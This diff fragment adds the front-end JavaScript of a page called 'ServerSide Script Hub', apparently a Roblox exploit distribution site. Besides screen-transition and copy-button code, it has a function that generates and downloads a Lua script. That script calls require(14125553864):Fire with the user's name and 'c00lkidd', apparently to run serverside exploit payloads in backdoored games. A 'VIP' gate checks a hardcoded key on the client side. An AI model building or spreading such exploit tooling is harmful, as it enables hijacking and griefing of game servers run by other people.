+                titleBar.style.color = "#fff";
+
+                const homeScreen = document.getElementById('home-screen');
+                homeScreen.style.display = 'flex';
+                setTimeout(() => { homeScreen.style.opacity = '1'; }, 50);
+            }, 500); 
+        }
+
+        function goToDashboard() {
+            document.getElementById('home-screen').style.display = 'none';
+            
+            document.body.style.backgroundColor = "var(--bg-color)";
+            canvas.style.opacity = "0.15";
+            document.getElementById('landing-grid-bg').style.opacity = "0";
+
+            const container = document.getElementById('main-container-box');
+            container.style.backgroundColor = "var(--panel-bg)";
+            container.style.borderColor = "var(--glow-color)";
+            container.style.boxShadow = "0 0 25px rgba(0, 255, 65, 0.2)";
+
+            const titleBar = document.getElementById('hub-title');
+            titleBar.style.borderBottomColor = "var(--glow-color)";
+            titleBar.style.color = "var(--glow-color)";
+            titleBar.innerText = `SYSTEM // ONLINE: ${globalUsername.toUpperCase()}`;
+
+            const dashboard = document.getElementById('main-dashboard');
+            dashboard.style.display = 'block';
+            setTimeout(() => { dashboard.style.opacity = '1'; }, 50);
+        }
+
+        function goToHome() {
+            document.getElementById('main-dashboard').style.display = 'none';
+            
+            document.body.style.backgroundColor = "var(--landing-bg)";
+            canvas.style.opacity = "0";
+            document.getElementById('landing-grid-bg').style.opacity = "1";
+
+            const container = document.getElementById('main-container-box');
+            container.style.backgroundColor = "var(--landing-panel)";
+            container.style.borderColor = "rgba(255,255,255,0.06)";
+
+            const titleBar = document.getElementById('hub-title');
+            titleBar.style.borderBottomColor = "rgba(255,255,255,0.06)";
+            titleBar.style.color = "#fff";
+            titleBar.innerText = "ServerSide Script Hub";
+
+            const home = document.getElementById('home-screen');
+            home.style.display = 'flex';
+            setTimeout(() => { home.style.opacity = '1'; }, 50);
+        }
+
+        function checkVipKey() {
+            const inputKey = document.getElementById('vip-key-input').value.trim();
+            if (inputKey === PREMIUM_KEY) {
+                isVipUnlocked = true;
+                document.getElementById('vip-auth').style.display = 'none';
+                document.getElementById('vip-content').style.display = 'flex';
+                alert("[+] ACCESO CONCEDIDO: Módulos VIP desbloqueados.");
+            } else {
+                alert("[-] ERROR DE CLAVE: Código incorrecto.");
+            }
+        }
+
+        function switchTab(event, tabId) {
+            const contents = document.querySelectorAll('.tab-content');
+            const buttons = document.querySelectorAll('.tab-btn');
+            contents.forEach(content => content.classList.remove('active'));
+            buttons.forEach(btn => btn.classList.remove('active'));
+
+            document.getElementById(tabId).classList.add('active');
+            event.currentTarget.classList.add('active');
+            
+            if (tabId === 'premium' && isVipUnlocked) {
+                document.getElementById('vip-auth').style.display = 'none';
+                document.getElementById('vip-content').style.display = 'flex';
+            }
+        }
+
+        function copyScript(buttonElement, id) {
+            const text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                buttonElement.innerText = "COPIED";
+                buttonElement.style.backgroundColor = buttonElement.classList.contains('vip-copy-btn') ? "var(--vip-color)" : "var(--glow-color)";
+                buttonElement.style.color = "#000";
+                setTimeout(() => {
+                    buttonElement.innerText = "COPY";
+                    buttonElement.style.backgroundColor = "transparent";
+                    buttonElement.style.color = buttonElement.classList.contains('vip-copy-btn') ? "var(--vip-color)" : "var(--glow-color)";
+                }, 1500);
+            });
+        }
+
+        function downloadLuaScript() {
+            const luaCode = `-- [[ ROBLOX REQUIRE SCRIPT HUB ]] --\n` +
+                `local LocalPlayer = game:GetService("Players").LocalPlayer\n` +
+                `require(14125553864):Fire("${globalUsername}","c00lkidd")\n`;
+
+            const blob = new Blob([luaCode], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none'; a.href = url; a.download = 'ScriptHub.lua';
+            document.body.appendChild(a); a.click();
+            window.URL.revokeObjectURL(url); document.body.removeChild(a);
+        }
+    </script>
+</body>
+</html>
